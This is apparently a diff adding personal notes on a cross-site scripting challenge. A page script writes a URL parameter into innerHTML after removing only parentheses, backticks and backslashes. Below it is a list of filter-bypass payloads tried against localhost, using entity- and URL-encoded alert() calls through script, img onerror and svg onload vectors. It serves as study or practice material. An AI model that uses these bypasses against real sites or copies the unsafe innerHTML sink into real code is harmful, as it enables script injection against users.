@@ -1,0 +1,37 @@
+Ah That's Hawt
+
+<!-- Challenge -->
+<h2 id="will"></h2>
+<script>
+    smith = (new URL(location).searchParams.get('markassbrownlee') || "Ah That's Hawt")
+    smith = smith.replace(/[\(\`\)\\]/g, '')
+    will.innerHTML = smith
+</script>
+
+http://localhost:8000/test.html?markassbrownlee=test
+http://localhost:8000/test.html?markassbrownlee=<script>alert(123)</script>
+http://localhost:8000/test.html?markassbrownlee=<script>alert\u0028123\u0029</script>
+http://localhost:8000/test.html?markassbrownlee=<script>javascript:alert%2823%29</script>
+http://localhost:8000/test.html?markassbrownlee=<script>alert&lpar;23&rpar;</script>
+http://localhost:8000/test.html?markassbrownlee=<script>javascript:alert\x281\x29</script>
+
+&#x3C;script&#x3E;alert(123)&#x3C;/script&#x3E;
+http://localhost:8000/test.html?markassbrownlee=%26%23x3C%3Bscript%26%23x3E%3Balert%28123%29%26%23x3C%3B%2Fscript%26%23x3E%3B
+http://localhost:8000/test.html?markassbrownlee=%26%23x3C%3Bimg%20src%3D%26%23x27%3Bx%26%23x27%3B%20onerror%3D%26%23x27%3Balert%28123%29%26%23x27%3B%26%23x3E%3B
+http://localhost:8000/test.html?markassbrownlee=%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E
+
+
+<!-- URL Encoding + HTML Entity Encoding -->
+%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E
+
+<!-- HTML Entity Encoding -->
+<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">
+
+<!-- No Encoding -->
+<svg onload="alert(1337)">
+
+
+<img src='x' onerror='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;'>
+<input value='&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;' />
+
+http://localhost:8000/test.html?markassbrownlee=%3cimg%20src%3d%27x%27%20onerror%3d%27%26%23x61%3b%26%23x6C%3b%26%23x65%3b%26%23x72%3b%26%23x74%3b%26%23x28%3b%26%23x31%3b%26%23x33%3b%26%23x33%3b%26%23x37%3b%26%23x29%3b%27%3e
